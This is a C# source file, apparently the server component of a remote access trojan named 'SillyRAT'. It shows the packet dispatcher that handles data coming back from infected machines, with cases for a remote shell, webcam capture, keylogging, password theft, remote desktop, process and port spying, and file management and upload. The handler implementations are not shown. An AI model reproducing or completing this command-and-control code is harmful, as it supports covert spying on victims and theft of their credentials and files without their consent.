using System.Windows.Forms;
using Stuff;
using Server.Connection;
using System.Threading;
using SillyRAT;
using System;
using System.Drawing;

namespace Server.Handlers
{
    internal class HandlePacket
    {

        public SillyClient SillyClient { get; set; }
        public byte[] packet { get; set; }
        public void Run(object state)
        {
            if (packet == null) return;
            Unpack meow = new Unpack();
            meow.Unpacc(packet);
            switch (meow.GetAsString("Packet"))
            {
                case "listinfo":
                    {
                        Program.form2.Invoke(new Action(() =>
                        {
                            Program.form2.AddLog("Loading and checking client information", Color.Purple);
                        }));
                        new HandleClient(SillyClient, meow);
                        Pack pack = new Pack();
                        pack.Set("Packet", "RemoteDesktop");
                        pack.Set("Command", "Stop");
                        SillyClient.Send(pack.Pacc());
                        break;
                    }
                case "Clientinfo":
                    {
                        Program.form2.Invoke(new Action(() =>
                        {
                            Program.form2.AddLog("Advanced client information packet sent", Color.Purple);
                        }));
                        new HandleInfo(SillyClient, meow);
                        break;
                    }
                case "Shell":
                    {
                        new HandleShell(SillyClient, meow);
                        break;
                    }
                case "Ping":
                    {
                        Thread.Sleep(1500);
                        Pack pack = new Pack();
                        pack.Set("Packet", "Ping");
                        pack.Set("Message", "From client !");
                        SillyClient.Send(pack.Pacc());
                        break;
                    }
                case "Webcam":
                    {
                        new HandleWebcam(SillyClient, meow);
                        break;
                    }
                case "StopWebcam":
                    {
                        Program.form2.Invoke(new Action(() =>
                        {
                            Program.form2.AddLog("Webcam stream packet stopped", Color.Purple);
                        }));
                        new HandleWebcam(SillyClient, meow);
                        break;
                    }
                case "ProcessSpy":
                    {
                        Program.form2.Invoke(new Action(() =>
                        {
                            Program.form2.AddLog("Process spy packet sent", Color.Purple);
                        }));
                        new HandleProcessManager(SillyClient, meow);
                        break;
                    }
                case "RemoteDesktop":
                    {
                        // Updates every ms, so don't log anything!
                        new HandleDesktop().Run(SillyClient, meow);
                        break;
                    }
                case "PortSpy":
                    {
                        new HandlePortManager(SillyClient, meow);
                        break;
                    }

                case "Keylogger":
                    {
                        new HandleKeylogger(SillyClient, meow);
                        break;
                    }
                case "Password":
                    {
                        new HandlePasswords(SillyClient, meow);
                        break;
                    }
                case "Manager":
                    {
                        new HandleFileManager(SillyClient, meow);
                        break;
                    }
                case "Upload":
                    {
                        new HandleUpload().init(SillyClient, meow);
                        break;
                    }
                // other

                case "Error":
                    {
                        string error = meow.GetAsString("Error");
                        Program.form2.AddLog("Warning from client: " + error, Color.FromArgb(255, 164, 54)); break;
                    }
                default:
                    {
                        Program.form2.Invoke(new Action(() =>
                        {
                            Program.form2.AddLog("Invalid packet: " + meow.GetAsString("packet") , Color.FromArgb(255, 164, 54));
                        }));
                        break;
                    }
            }
        }
    }
}
